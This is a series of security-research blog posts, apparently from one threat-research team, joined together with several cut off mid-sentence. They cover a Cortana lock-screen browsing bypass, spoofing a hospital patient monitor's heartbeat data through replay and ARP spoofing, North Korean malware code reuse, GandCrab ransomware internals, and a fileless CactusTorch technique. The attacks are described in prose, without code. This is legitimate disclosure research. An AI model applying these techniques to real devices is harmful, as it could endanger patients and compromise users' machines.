Instead of creating an entry in Wikipedia, making sure that Bing indexes it and that Cortana provides the official website link, we opted for an alternative. We can instead hunt Wikipedia for unmaintained or dead official website links. Fortunately for us, Wikipedia maintains a list of “dead links” and “permanent dead links.” A search for “Xbox Linux” looks like this:
:\/:
This is neither an exhaustive list, nor the most efficient regular expression, but it does find some candidates without triggering the Wikipedia query timeout.
:\/:
The next step is to write a script to parse the output, grab a list of domains, and check whether they are actually vacant. Many of them are still registered but do not serve any content; others are live despite the “dead link” tag. We end up with a list of domains, some more expensive than others, that are vacant.
:\/:
What will Cortana display for each of these Wikipedia entries? One after another, we ask. Retrospectively, writing a text-to-speech script would have been faster. Cortana answers surprisingly well to other digital speech synthesizers.
:\/:
Many of the entries do not provide the official website link, but some do. It is annoying that the way you ask the question interferes with the results. Not only is the phrasing of the question important; the decision of whether to dictate a word or spell it out may change the answer. To obtain the answer you want from Cortana, you may have to combine both approaches.
:\/:
For example, we asked “Hey Cortana, what is Miss Aruba?” We saw, while the device was locked, the following answer:
:\/:
The official website link points to “hxxp://www.missaruba.aw.” A quick search shows the domain is still available.
:\/:
In conclusion, we now have Wikipedia articles for which Cortana will display an official website link, and for which the domain is available for purchase. After spending $11.99 for a cheaper domain, we own one.
:\/:
Although it took some regular-expression authoring, some scripting, and buying a domain, this method was faster and more satisfying than waiting for Bing to publish and index a new Wikipedia entry.
:\/:
After this setup, what can we accomplish? We can ask Cortana (either via the interactive icon or vocal command “Hey Cortana”) to conduct a search while the device is locked. When she replies, we can click on the official website link and observe as Edge retrieves the content while the device remains locked.  To put a malicious spin on this unauthorized access, we have at least one straightforward option. We could install the latest exploit kit on our newly acquired domain and infect any locked Windows 10 PC with Cortana enabled without ever logging in. This attack could occur at a coffee shop, retailer, bank, or against targeted individuals. This configuration is the default on Windows, and our research has shown that many users never disable Cortana from the lock screen.
:\/:
Digital voice assistants can be useful, but they must also be considered an attack vector. Although some may think this is a “noisy” vector, not applicable when stealth is required, you can employ techniques such as the DolphinAttack, which uses inaudible voice commands to close an air gap. Or if you have physical access to the device, a $5 3.5mm-jack cable will do as well.
:\/:
How can we protect against this attack vector? You can disable Cortana on your lock screen. Microsoft should not allow navigation to untrusted websites until it receives permission from the authenticated user, confirming on login that the user wants to visit a site.
:\/:
When we investigate a technology, we sometimes find that our initial findings are less substantial than what we learn after further investigation. Our research into Cortana and this attack surface was no different. What if one could surf the web freely with a full-fledged browser such as Internet Explorer 11, with access to cached credentials and autocomplete on a locked Windows 10 device? All thanks to Cortana? That could be much more impactful than browsing to just one URL.
:\/:
 It makes sense that Cortana offers skills similar to those of Amazon’s Alexa or Google Assistant. But it does not make sense to offer these skills directly from the lock screen when they are not yet configured.
:\/:
One example is the “Real Estate Search” skill. While conversing with Cortana to analyze the capabilities she could offer an attacker, we found that she occasionally offered to try skills, including Real Estate Search.
:\/:
One easy trigger is to ask “Hey Cortana, I want to sell my house.” This leads to the following screen:
:\/:
If we click “Real Estate Search,” we get a login screen. Instead of logging in, let’s look at the other links offered by the interface. In the current case, the “Privacy Policy” link seems interesting:
:\/:
Opening the link, we see a lengthy policy. If we scroll to the bottom of the page, we discover a few social media icons:
:\/:
These icons are indeed links, allowing us to reach Facebook or YouTube, and from there the rest of the Internet:
:\/:
Let’s summarize. You left for lunch with your new Windows Surface Book locked on your desk. Cortana is on by default on your lock screen. Your disk is encrypted. What could go wrong?
:\/:
Anybody who has physical access to your locked device can start browsing the web. What if someone were to navigate to a work-unfriendly website from your device, or post inflammatory comments in a public forum that could be attributed to your device’s IP address?
:\/:
A device-specific attribution would be bad, but could you use the same method to post or access something from a real person’s name or account? We next investigated which browser is being used? Is it a Cortana custom browser? Is it a sandboxed Microsoft Edge? It is actually a customized Internet Explorer 11 restricted engine running in the context of AuthHost.exe. (We will publish another analysis on this limited “browser” because its properties and lack of security mechanisms could become handy for red teams.)
:\/:
This is the Internet Explorer engine and not the full browser, though both JavaScript and cookies are enabled. Worse, this incarnation shares the autocomplete and credentials saved in the context of the current user’s Internet Explorer session.
:\/:
Thus in addition to posting a comment on a public forum from another user’s device while the device is locked, you can also impersonate the user thanks to its cached credentials.
:\/:
One potential attack scenario arises if a corporation offers a mechanism to reset Windows credentials via a web server but does not require users to reenter the old password. One could simply navigate to the reset link, input a new password, exit the limited navigator, and unlock the device with the newly set password, all from a locked computer.
:\/:
We have explored a couple of attack scenarios and security issues in this post, and we will continue our investigation into Cortana and other digital assistants as an attack vector. Your best mitigation at this point is to turn off Cortana on the lock screen. Here is 
:\/:
With the explosion of growth in technology and its influence on our lives, we have become increasingly dependent on it. The medical field is no exception: Medical professionals trust technology to provide them with accurate information and base life-changing decisions on this data. McAfee’s Advanced Threat Research team is exploring these devices to increase awareness about their security.
:\/:
Some medical devices, such as pacemakers and insulin pumps, have already been examined for security concerns. To help select an appropriate target for our research, we spoke with a doctor. In our conversations we learned just how important the accuracy of a patient’s vital signs is to medical professionals. “Vital signs are integral to clinical decision making” explained Dr. Shaun Nordeck. Bedside patient monitors and related systems are key components that provide medical professionals with the vital signs they need to make decisions; these systems are now the focal point of this research.
:\/:
Most patient monitoring systems comprise at minimum of two basic components: a bedside monitor and a central monitoring station. These devices are wired or wirelessly networked over TCP/IP. The central monitoring station collects vitals from multiple bedside monitors so that a single medical professional can observe multiple patients.
:\/:
With the help of eBay, we purchased both a patient monitor and a compatible central monitoring station at a reasonable cost. The patient monitor monitored heartbeat, oxygen level, and blood pressure. It has both wired and wireless networking and appeared to store patient information. The central monitoring station ran Windows XP Embedded, with two Ethernet ports, and ran in a limited kiosk mode at start-up. Both units were produced around 2004; several local hospitals confirmed that these models are still in use.
:\/:
The two devices offer a range of potential attack surfaces. The central monitoring station operates fundamentally like a desktop computer running Windows XP, which has been extensively researched by the security community. The application running on the central monitoring station is old; if we found a vulnerability, it would likely be tied to the legacy operating system. The patient monitor’s firmware could be evaluated for vulnerabilities; however, this would affect only one of the two devices in the system and is the hardest vector to exploit. This leaves the communication between the two devices as the most interesting attack vector since if the communication could be compromised, an attack could possibly be device independent, affecting both devices by a remote attack. Given this possibility, we chose networking as the first target for this research. Dr. Nordeck confirmed that if the information passing to the central monitoring system could be modified in real time, this would be a meaningful and valid concern to medical professionals. Thus the primary question of our research became “Is it possible in real time to modify a patient’s vitals being transmitted over the network?”
:\/:
When performing a vulnerability assessment of any device, it is best to first operate the device as originally designed. Tracking vital signs is the essence of the patient monitor, so we looked for a way to accurately simulate those signs for testing. Many hardware simulators are on the market and vary drastically in cost. The cheapest and easiest vital sign to simulate turned out to be a heartbeat. For less than $100 we purchased an electrocardiogram (ECG) simulator on eBay. The following image illustrates our test network:
:\/:
In our test bed, the patient monitor (left), central monitoring station (right), and a research computer (top) were attached to a standard switch. The research computer was configured on a monitor port of the switch to sniff the traffic between the central monitoring device and the patient monitor. The ECG simulator was attached to the patient monitor.
:\/:
With the network configured, we turned to Wireshark to watch the devices in action. The first test was to boot only the central monitor station and observe any network traffic.
:\/:
In the preceding screenshot a few basic observations stand out. First, we can see that the central station is sending User Datagram Protocol (UDP) broadcast packets every 10 seconds with a source and destination port of 7000. We can also see clear-text ASCII in the payload, which provides the device name. After collecting and observing these packets for several minutes, we can assume this is standard behavior. Because the central station is running on a Window XP embedded machine, we can attempt to verify this information by doing some quick reverse engineering of the binaries used by the application. After putting several libraries into Interactive Disassembler Pro, it is apparent that the symbols and debugging information has been left behind. With a little cleanup and work from the decompilers, we see the following code:
:\/:
This loop calls a function that broadcasts Rwhat, a protocol used by some medical devices. We also can see a function called to get the amount of time to wait between packets, with the result plugged into the Windows sleep function. This code block confirms what we saw with Wireshark and gives us confidence the communication is consistent.
:\/:
Having gained basic knowledge of the central monitoring station, the next step was to perform the same test on the patient monitor. With the central station powered down, we booted the patient monitor and watched the network traffic using Wireshark.
:\/:
We can make similar observations about the patient monitor’s broadcast packets, including the 10-second time delay and patient data in plaintext. In these packets we see that the source port is incrementing but the destination port, 7000, is the same as the central monitoring station’s.  After reviewing many of these packets, we find that offset 0x34 of the payload has a counter that increments by 0xA, or 10, with each packet. Without potentially damaging the patient monitor, there is no good way to extract the firmware to review its code. However, the central monitoring station must have code to receive these packets. With a bit of digging through the central station’s binaries, we found the section parsing the broadcast packets from the patient monitor.
:\/:
The first line of code parses the payload of the packet plus 12 bytes. If we count in 12 bytes from the payload on the Wireshark capture, we can see the start of the patient data in clear text. The next function called is parse_logical_name, whose second parameter is an upper limit for the string being passed. This field has a maximum length of 0x20, or 32, bytes. The subsequent code handles whether this information is empty and stores the data in the format logical_name. This review again helps confirm what we see in real time with Wireshark.
:\/:
Now that we understand the devices’ separate network traffic, we can look at how they interact. Using our network setup and starting the ECG simulator we can see the central monitor station and the patient monitor come to life.
:\/:
With everything working, we again use Wireshark to examine the traffic. We find a new set of packets.
:\/:
In the preceding screen capture we see the patient monitor at IP address 126.4.153.150 is sending the same-size data packets to the central monitoring station at address 126.1.1.1. The source port does not change.
:\/:
Our reconnaissance tells us we may have the right conditions for a replay attack. Such an attack would not satisfy our goal of modifying data in real time across the network; however, it would provide more insight about the requirements and may prove useful in reaching our goal.
:\/:
After capturing the packets from the simulated heartbeat, we attempted to replay the captures using Python’s Scapy library. We did this with the patient monitor turned off and the central monitoring station listening for information. After several attempts, this test was unsuccessful. This failure shows the system expects more than just a device sending data packets to a specific IP address.
:\/:
We examined more closely the packets that are sent before the data packets. We learned that even though the packets are sent with UDP, some sort of handshake is performed between the two devices. The next diagram describes this handshake.
:\/:
To understand what is happening during the handshake, we can relate each phase of this handshake to that of a TCP three-way handshake. (This is only an analogy; the device is not actually performing a TCP three-way handshake.)
:\/:
The central monitoring station first sends a packet to port 2000 to the patient monitor. This can be considered the “SYN” packet. The patient monitor responds to the central station; notice it responds to the source port of the initial request. This can be considered the “SYN,ACK.” The central station sends the final “ACK,” essentially completing a three-way (or three-step) handshake. Directly following this step, the patient monitor sends another packet to the initial port of the “SYN” packet. The central monitor responds to the patient monitor on port 2000 with a new source port. Immediately following, we see the data packets being sent to the new source port, 3627, named in the previous exchange.
:\/:
This exam provides insight into why the replay attack did not work. The central station defines for each connection which ports will be open for the incoming data; we need to consider this when attempting a replay attack. Modifying our previous Scapy scripts to account for the handshake, we retested the replay attack. With the new handshake code in place, the test still failed. Taking another look at the “SYN,ACK” packets provides a potential reason for the failure.
:\/:
At offset 0x3D is a counter that needs to be incremented each time one of these packets is sent. In this case the patient monitor’s source IP address is embedded in the payload at offsets 0x2A and 0x30. This embedded IP address is not as important for this attack because during the replay our scripts can become the patient monitor’s IP; however, this will become more important later. The newly discovered counter needs to be accounted for and incremented.
:\/:
By taking these new findings into account our replay attack becomes successful. If we can observe a certain ECG pattern, we can play it back to the central monitoring station without the patient monitor on the network. Thus we can emulate the function of the patient monitor with any device. The following video demonstrates this emulation using a Raspberry Pi. We set our Scapy scripts to load after booting the Pi, which mimics the idle function of the patient monitor. When the central monitor requests information about the patient’s vitals, the Pi provides the station with an 80-beats-per-minute wave form. This also works with the other vital signs.
:\/:
Although we have not yet reached our goal of real-time modification, we must consider the implications of this type of attack. If someone were to unplug the monitor of a stable patient and replace it with a device that continued to report the same stable vitals, would that cause any harm? Probably not immediately. But what if the stable patient suddenly became unstable? The central station would normally sound an alarm to alert medical personal, who could take appropriate action. However, if the monitor had been replaced, would anyone know help was needed? The patient monitor also normally sounds alarms that might be heard in and outside of the patient’s room, yet if the monitor was replaced, those alarms would be absent.
:\/:
In hospitals, nurses and other personal generally make periodic checks even of stable patients. So any deception might not last long, but it might not need to. What if someone were trying to kidnap a patient? A kidnapper would alert fewer people than would be expected.
:\/:
Switching from a real patient monitor to an emulator would cause a short loss in communication from the patient’s room to the central monitoring station. Is this enough to make the scenario unrealistic or not a threat? We asked Dr. Nordeck if a short loss in connection could be part of a reasonable scenario. “A momentary disconnection of the ECG would likely go unnoticed as this happens often due to patient movement or changing clothes and, as long as it is reconnected, will be unlikely to cause an alert,” he said.
:\/:
Although emulating the patient monitor is interesting, it did not accomplish our goal of making real-time modifications. Using what we learned while testing emulation, could we perform real-time injection? To answer this question, we must first understand the difference between emulation and real-time injection.
:\/:
Emulation requires a deeper understanding of how the initial connection, the handshake, between the two devices occurred. When considering real-time modification, this handshake has already taken place. But an attacker would not know which port the data packets are being sent too, nor any of the other ports used in the data stream. Plus, because the real patient monitor is still online, it will constantly send data to the central monitoring station.
:\/:
One way to account for these factors is to use Address Resolution Protocol (ARP) spoofing. If the patient monitor is ARP spoofed, then the attacker, instead of the central monitoring station, would receive the data packets. This step would allow the attacker to determine which ports are in use and stop the patient monitor’s data from getting to the central monitoring station. Because we have already shown that emulation works, the attacker simply has to send replacement data to the central station while appearing as the patient monitor.
:\/:
The patient monitor sends a packet with the patient’s heartbeat stored at offset 0x71 in the payload. The patient monitor in this screen capture is at IP address 126.4.153.150. An attacker can ARP spoof the patient monitor with a Kali virtual machine.
:\/:
The ARP packets indicate that the central station, IP address 126.1.1.1, is at MAC address 00:0c:29:a1:6e:bf, which is actually the Kali virtual machine. Wireshark recognizes two MACs with the same IP address assigned and highlights them, showing the ARP spoof.
:\/:
Next the attacker from the virtual machine at address 126.4.153.153 sends false information to the central monitoring station, still at address 126.1.1.1. In this example, offset 0x71 has been changed to 0x78, or 120. (The attacker could choose any value; the following demo videos use the heartbeat value 180 because it is more alarming.) Also notice the IP address stored in the payload, which we discovered during the reconnaissance phase. It still indicates this data is coming from the original patient monitor address, which is different from the IP address on the packet’s IP header. Due to this implementation, there is no need for the attacker to spoof their IP address for the attack to be successful.
:\/:
Although the monitor in the patient’s room is not directly affected, real-time modification is impactful because medical professionals use these central stations to make critical decisions on a large number of patients—instead of visiting each room individually. As long as the changes are believable, they will not always be verified.
:\/:
Dr. Nordeck explains the impact of this attack: “Fictitious cardiac rhythms, even intermittent, could lead to extended hospitalization, additional testing, and side effects from medications prescribed to control heart rhythm and/or prevent clots. The hospital could also suffer resource consumption.” Dr. Nordeck explained that short changes to a heartbeat would generally trigger the nurse or technician monitoring the central station to page a doctor. The doctor would typically ask for a printout from the central station to review the rhythm. The doctor might also order an additional test, such as an EKG, to verify the rhythm. An EKG, however, would not likely capture an abnormal rhythm if it is intermittent, but the test might reveal an underlying cause for intermittent arrythmia. Should the rhythm recur intermittently throughout the day, the doctor might make treatment decisions based on this erroneous printout.
:\/:
The American Heart Association and American College of Cardiology publish guidelines that hospitals are to follow, including for “intermittent cardiac rhythms,” seen in this chart:
:\/:
The first decision point in this tree asks if the patient is hemodynamically stable (whether the blood pressure is normal). This attack does not affect the bedside monitor. A nurse might retake the patient’s blood pressure, which would be normal. The next decision point following the “Yes” path is a diagnosis of focal atrial tachycardia. Regardless of the medical terms and answers, the patient is issued medication. In the case of a network attack, this is medication the patient does not need and could cause harm.
:\/:
This research from McAfee’s Advanced Threat Research team shows it is possible to emulate and modify a patient’s vital signs in real time on a medical network using a patient monitor and central monitoring station. For this attack to be viable, an attacker would need to be on the same network as the devices and have knowledge of the networking protocol. Any modifications made to patient data would need to be believable to medical professionals for there to be any impact.
:\/:
During our research we did not modify the patient monitor, which always showed the true data; but we have proven the impact of an attack can be meaningful. Such an attack could result in patients receiving the wrong medications, additional testing, and extended hospital stays—any of which could incur unnecessary expenses.
:\/:
Both product vendors and medical facilities can take measures to drastically reduce the threat of this type of attack. Vendors can encrypt network traffic between the devices and add authentication. These two steps would drastically increase the difficulty of this type of attack. Vendors also typically recommend that medical equipment is run on a completely isolated network with very strict network-access controls. If medical facilities follow these recommendations, attackers would require physical access to the network, greatly helping to reduce the attack surface.
:\/:
One goal of the McAfee Advanced Threat Research team is to identify and illuminate a broad spectrum of threats in today’s complex and constantly evolving landscape. Through responsible disclosure we aim to assist and encourage the industry toward a more comprehensive security posture. As part of our policy, we reported this research to the vendor whose products we tested and will continue to work with other vendors to help secure their products.

Attacks from the online groups Lazarus, Silent Chollima, Group 123, Hidden Cobra, DarkSeoul, Blockbuster, Operation Troy, and 10 Days of Rain are believed to have come from North Korea. But how can we know with certainty? And what connection does a DDoS and disk-wiping attack from July 4, 2009, have with WannaCry, one of the largest cyberattacks in the history of the cyber sphere? 
:\/:
From the Mydoom variant Brambul to the more recent Fallchill, WannaCry, and the targeting of cryptocurrency exchanges, we see a distinct timeline of attacks beginning from the moment North Korea entered the world stage as a significant threat actor.
:\/:
Bad actors have a tendency to unwittingly leave fingerprints on their attacks, allowing researchers to connect the dots between them. North Korean actors have left many of these clues in their wake and throughout the evolution of their malware arsenal.
:\/:
This post reflects months of research; in it we will highlight our code analysis illustrating key similarities between samples attributed to the Democratic People’s Republic of Korea, a shared networking infrastructure, and other revealing data hidden within the binaries. Together these puzzle pieces show the connections between the many attacks attributed to North Korea and categorize different tools used by specific teams of their cyber army.
:\/:
This article is too short to dig deeply into the history, politics, and economic changes of recent years. Nonetheless, we must highlight some events to put past and present cyber events into perspective.
:\/:
The DPRK, like any country, wants to be as self-sufficient and independent as possible. However, for products such as oil, food, and foreign currency for trading, the country lacks resources and has to find ways of acquiring them. What can a nation do when legal international economics are denied? To survive, it must gain foreign currency for trading. One of the oldest ways to do this is to join the worlds of gambling (casinos) and drugs. In 2005, the United States wanted to shut down North Korean enterprises involved in illegal operations. They investigated a couple of banks in Asia that seemed to have ties with North Korea and operated as money laundering sites. One bank in particular is controlled by a billionaire gambling mogul who started a casino in Pyongyang and has close ties to Pyongyang. That bank, based in Macau, came back into the picture during an attack on the SWIFT financial system of a bank in Vietnam in 2015. The Macau bank was listed twice in the malware’s code as a recipient of stolen funds:
:\/:
There are many reasons to reuse malware code, which is very common in the world of cybercrime. If we take an average ransomware campaign, for example, once the campaign becomes less successful, actors often change some of basics such as using a different packer to bypass defenses. With targeted campaigns, an adversary must keep its tools undetected for as long as possible. By identifying reused code, we gain valuable insights about the “ancestral relations” to known threat actors or other campaigns. Our research was heavily focused on this type of analysis.
:\/:
In our years of investigating cyber threats, we have seen the DPRK conduct multiple cyber campaigns. In North Korea, hackers’ skills determine which cyber units they work for. We are aware two major focuses of DPRK campaigns: one to raise money, and one to pursue nationalist aims. The first workforce gathers money for the nation, even if that means committing cybercrime to hack into financial institutions, hijack gambling sessions, or sell pirated and cracked software. Unit 180 is responsible for illegally gaining foreign currency using hacking techniques. The second workforce operates larger campaigns motivated by nationalism, gathering intelligence from other nations, and in some cases disrupting rival states and military targets. Most of these actions are executed by Unit 121.
:\/:
We focused in our research on the larger-scale nationalism-motivated campaigns, in which we discovered many overlaps in code reuse. We are highly confident that nation-state–sponsored groups were active in these efforts.
:\/:
We created a timeline of most of the malware samples and noticeable campaigns that we examined. We used primarily open-source blogs and papers to build this timeline and used the malware artifacts as a starting point of our research.
:\/:
During our research, we found many malware family names that are believed to be associated with North Korea’s cyber operations. To better understand this threat actor and the similarities between the campaigns, we have used Intezer’s code similarity detection engine to plot the links between a vast number of these malware families.
:\/:
The following graph presents a high-level overview of these relations. Each node represents a malware family or a hacking tool (“Brambul,” “Fallchill,” etc.) and each line presents a code similarity between two families. A thicker line correlates to a stronger similarity. In defining similarities, we take into account only unique code connections, and disregard common code or libraries. This definition holds both for this graph and our entire research.
:\/:
We can easily see a significant amount of code similarities between almost every one of the attacks associated with North Korea. Our research included thousands of samples, mostly unclassified or uncategorized. This graph was plotted using a data set of only several hundred samples, so there might be more connections than displayed here.
:\/:
During our research, we came across many code similarities between North Korean binaries that had not been seen before. Some of these attacks and malware have not been linked to one another, at least publicly. We will showcase four examples of reused code that has been seen only in malware attributed to North Korea.
:\/:
The first code example appeared in the server message block (SMB) module of WannaCry in 2017, Mydoom in 2009, Joanap, and DeltaAlfa. Further shared code across these families is an AES library from CodeProject. These attacks have been attributed to Lazarus; that means the group has reused code from at least 2009 to 2017.
:\/:
In the next screenshots we highlight the exact code block that reflects the SMB module we found in campaigns other than WannaCry and Mydoom.
:\/:
For our research we compared the three major variants of WannaCry. An early release, called a beta, from February 2017, one from April, and the infamous one that hit the world in May.
:\/:
The second example demonstrates code responsible for mapping a file and using the XOR key 0xDEADBEEF on the first four bytes of the file. This code has appeared in the malware families NavRAT and Gold Dragon, plus a certain DLL from the South Korean gambling hacking campaign. These three RATs are thought to be affiliated with North Korea’s Group 123. NavRAT and the gambling DLL share more code, making them closer variants.
:\/:
The third example, responsible for launching a cmd.exe with a net share, has been seen in 2009’s Brambul, also known as SierraBravo, as well as KorDllBot in 2011. These malware families are also attributed to the Lazarus group.
:\/:
In 2014, Kaspersky reported a more than seven-year campaign against Asian hotels, in which the adversaries used an arsenal of tools to break into the computers of hotel visitors. Zero days and control servers were used, along with the malware family Tapaoux, or DarkHotel, according to the report.
:\/:
While we examined the DPRK samples, we noticed a hit with the Dark Hotel samples in our collections. By going through the code, we noticed several pieces of code overlap and reuse, for example, with samples from Operation Troy.
:\/:
By applying what we learned from our comparisons and code-block identifications, we uncovered possible new links between malware families and the groups using them.
:\/:
With the different pieces of malware we have analyzed, we can illustrate the code reuse and sharing between the groups known to be affiliated with North Korea.
:\/:
The malware attributed to the group Lazarus has code connections that link many of the malware families spotted over the years. Lazarus is a collective name for many DPRK cyber operations, and we clearly see links between malware families used in different campaigns.
:\/:
The malware (NavRAT, gambling, and Gold Dragon) possibly created by Group 123 are connected to each other but are separate from those used by Lazarus. Although these are different units focusing on different areas, there seems to be a parallel structure in which they collaborate during certain campaigns.
:\/:
From our research of these malware samples, we can identify the following techniques used by the malware families:
:\/:
When we zoom in on the Discovery category in the MITRE model, for example, we notice that the techniques are typical for first-stage dropper malware. The adversary drops these samples on victims’ machines and collects information on where they landed in the victims’ networks and which user/access rights they gained.
:\/:
In 2018, we saw examples of campaigns in which attackers used PowerShell to download and execute these droppers. Once information has been sent to a control server, the adversary determines the next steps, which often include installing a remote access tool to enable lateral movement on the network and pursue the goals of the campaign.
:\/:
Security vendors and researchers often use different names when speaking about the same malware, group, or attack. This habit makes it challenging to group all the malware and campaigns. By taking a scientific approach, such as looking for code reuse, we can categorize our findings. We believe our research will help the security community organize the current “mess” we face in relation to North Korean malware and campaigns.
:\/:
We clearly saw a lot of code reuse over the many years of cyber campaigns we examined. This indicates the North Koreans have groups with different skills and tools that execute their focused parts of cyber operations while also working in parallel when large campaigns require a mix of skills and tools.
:\/:
We found our months of research, data gathering, and analysis very satisfying. By combining our skills, data, and technology, we were able to draw connections and reveal links that we had not seen before. The cybersecurity industry would greatly benefit from more collaboration and sharing of information, and we hope that this effort between McAfee and Intezer will inspire the community to work together more often.

:\/:
The GandCrab ransomware first appeared in January and has been updated rapidly during its short life. It is the leading ransomware threat. The McAfee Advanced Threat Research team has reverse engineered Versions 4.0 through 4.3 of the malware.
:\/:
The first versions (1.0 and 1.1) of this malware had a bug that left the keys in memory because the author did not correctly use the flags in a crypto function. One antimalware company released a free decryption tool, posted on 
:\/:
The text apologizes to partners for the hack and temporarily shuts down the program. It promises to release an improved version within a few days.
:\/:
The second version of GandCrab quickly appeared and improved the malware server’s security against future counterattacks. The first versions of the ransomware had a list of file extensions to encrypt, but the second and later versions have replaced this list with an exclusion list. All files except those on the list were encrypted.
:\/:
Old versions of the malware used RSA and AES to encrypt the files, and communicated with a control server to send the RSA keys locked with an RC4 algorithm.
:\/:
The GandCrab author has moved quickly to improve the code and has added comments to mock the security community, law agencies, and the NoMoreRansom organization. The malware is not professionally developed and usually has bugs (even in Version 4.3), but the speed of changes is impressive and increases the difficulty of combating it.
:\/:
The goal of GandCrab, as with other ransomware, is to encrypt all or many files on an infected system and insist on payment to unlock them. The developer requires payment in cryptocurrency, primarily DASH, because it complex to track, or Bitcoin.
:\/:
The malware is usually but not always packed. We have seen variants in .exe format (the primary form) along with DLLs. GandCrab is effectively ransomware as a service; its operators can choose which version they want.
:\/:
The most important change in Version 4.0 is in the algorithm used to encrypt files. Earlier versions used RSA and AES; the latest versions use Salsa20. The main reason is for speed. RSA is a powerful but slow algorithm. Salsa20 is quick and the implementation is small.
:\/:
The ransomware checks the language of the system and will not drop the malicious payload if the infected machine operates in Russian or certain other former Soviet languages:
:\/:
The ransomware generates a pair of RSA keys before encrypting any file. The public key encrypts the Salsa20 key and random initialization vector (IV, or nonce)) generated later for each file.
:\/:
The encryption procedure generates a random Salsa20 key and a random IV for each file, encrypts the file with them, and encrypts this key and IV with a pair of RSA keys (with the public RSA key created at the beginning). The private key remains encrypted in the registry using another Salsa20 key and IV encrypted with an RSA public key embedded in the malware.
:\/:
After encryption, the file key and IV are appended to the contents of the file in a new field of 8 bytes, increasing the original file size.
:\/:
This method makes GandCrab very strong ransomware because without the private key to the embedded public key, it is not possible to decrypt the files. Without the new RSA private key, we cannot decrypt the Salsa20 key and IV that are appended to the file.
:\/:
This version retains the Salsa20 algorithm, fixes some bugs, and adds a new function. This function, in a random procedure from a big list of domains, creates a final path and sends the encrypted information gathered from the infected machine. We do not know why the malware does this; the random procedure usually creates paths to remote sites that do not exist.
:\/:
For example, one sample of this version has the following hardcoded list of encrypted domains. (This is only a small part of this list.)
:\/:
Afterward it makes a file name, randomly choosing three or four combinations from the following list:
:\/:
At this point, the malware sends the encrypted information using POST to the newly generated URL for all domains in the embedded list, repeating the process of generating a path and name for each domain.
:\/:
Another important change in this version is the attempt to obfuscate the calls to functions such as VirtualAlloc and VirtualFree.
:\/:
This version has appeared with some variants. Two security companies revealed a vaccine to prevent infections by previous versions. The vaccine involved making a special file in a folder with a special name before the ransomware infects the system. If this file exists, the ransomware finishes without dropping the payload.
:\/:
The file gets its name from the serial number of the Windows logic unit hard disk value. The malware makes a simple calculation with this name and creates it in the %appdata% or %program files% folder (based in the OS) with the extension .lock.
:\/:
The GandCrab author reacted quickly, changing the operation to make this value unique and use the Salsa20 algorithm with an embedded key and IV with text referring to these companies. The text and the value calculated were used to make the filename; the extension remained .lock.
:\/:
One of the security companies responded by making a free tool to make this file available for all users, but within hours the author released another Version 4.1.2 with the text changed. The malware no longer creates any file, instead making a mutex object with this special name. The mutex remains and keeps the .lock extension in the name.
:\/:
The vaccine does not work with the second Version 4.1.2 and Version 4.2, but it does work with previous versions.
:\/:
It checks the number of remote units, the size of the ransomware name running compared with certain sizes, installs a VectoredExceptionHandler, and checks for VMware virtual machines using the old trick of the virtual port in a little encrypted shellcode:
:\/:
The malware calculates the free space of the main Windows installation logic unit and finally calculates a value.
:\/:
If this value is correct for the ransomware, it runs normally. If the value is less than 0x1E, it waits one hour to start the normal process. (It blocks automatic systems that do not have “sleep” prepared.) If the value is greater than 0x1E, the ransomware finishes its execution.
:\/:
This version appeared August 1. The change from the previous version is a text message to the company that made the vaccine along with a link to a source code zero-day exploit that attacks one of this company’s products. The code is a Visual Studio project and can be easily recompiled. This code has folders in Russian after loading the project in Visual Studio.
:\/:
It removes the code to detect virtual machines and a few other odd things in Version 4.2. This code had some failure points; some virtual machines could not be detected.
:\/:
It implemented an exploit against one product of the antivirus company that made the vaccine against Version 4.0 through the first release of Version 4.1.2. This code appears after the malware encrypts files and before it deletes itself.
:\/:
New code in some functions makes static analysis with Interactive Disassembler more complex. This is an easy but effective trick: The ransomware makes a delta call (which puts the address of the delta offset at the top of the stack) and adds 0x11 (the size of the special code, meaning the malware author is using a macro) to the value in the ESP register. ESP now points to an address after the block of the special code and makes a jump in the middle of the opcodes of this block. This technique makes it appear like another instruction, in this case “pop eax,” which extracts the value after adding 0x11 from the top of the stack (ESP register). The code later makes an unconditional jump to this address in EAX. This way the ransomware follows its normal code flow.
:\/:
GandCrab is the leading ransomware threat for any person or enterprise. The author uses many ways to install it—including exploits kits, phishing mails, Trojans, and fake programs. The developer actively updates and improves the code to make analysis more difficult and to detect virtual machines. The code is not professionally written and continues to suffer from bugs, yet the product is well promoted in underground forums and has increased in value.
:\/:
McAfee detects this threat as Ran-GandCrab4 in Versions 4.0 and later. Previous ones are also detected.
:\/:
Application process discovery: to detect antimalware and security products as well as normal programs

McAfee Labs has noticed a significant shift by some actors toward using trusted Windows executables, rather than external malware, to attack systems. One of the most popular techniques is a 
:\/:
 Because these attacks are launched through reputable executables, they are hard to detect. Both consumers and corporate users can fall victim to this threat. In corporate environments, attackers use this vector to move laterally through the network.
:\/:
One fileless threat, CactusTorch, uses the DotNetToJScript technique, which loads and executes malicious .NET assemblies straight from memory. These assemblies are the smallest unit of deployment of an application, such as a .dll or .exe. As with other fileless attack techniques, DotNetToJScript does not write any part of the malicious .NET assembly on a computer’s hard drive; hence traditional file scanners fail to detect these attacks.
:\/:
Compiling the DotNetToJScript tool gives us the .NET executable DotNetToJScript.exe, which accepts the path of a .NET assembly and outputs a JavaScript file.

The DotNetToJScript tool kit is never shipped with malware. The only component created is the output JavaScript file, which is executed on the target system by the script host (wscript.exe). For our analysis, we ran some basic deobfuscation and found 
:\/:
Before we dive into this code, we need to understand .NET and its COM exposure. When we install the .NET framework on any system, several .NET libraries are exposed via Microsoft’s Component Object Model (COM).
:\/:
If we look at the exposed interfaces, we can see IDispatch, which allows the COM object to be accessed from the script host or a browser.
:\/:
To execute malicious code using the DotNetToJScript vector, an attack uses the following COM objects:
:\/:
Now, let’s return to the JavaScript code we saw in Figure 2. The function base64ToStream()converts the Base64-encoded serialized object to a stream. Before we can fully understand the logic behind the JavaScript code, we need to examine the functionality of the Base64-encoded serialized object. Thus our next step is to reverse engineer the embedded serialized object and recreate the class definition. Once that was done, the class definition looks like the following code, which is responsible for executing the malicious shellcode. (Special thanks to Casey Smith, @subTee, for important pointers regarding this step).
:\/:
, and the JavaScript code in Figure 2 makes sense. We can see how the malicious shellcode is executed on the targeted system. In Figure 2, line 29 the code invokes the flame(x,x) function with two arguments: the executable to launch and the shellcode.
:\/:
The .NET assembly embedded in the CactusTorch script runs the following steps to execute the malicious shellcode:
:\/:
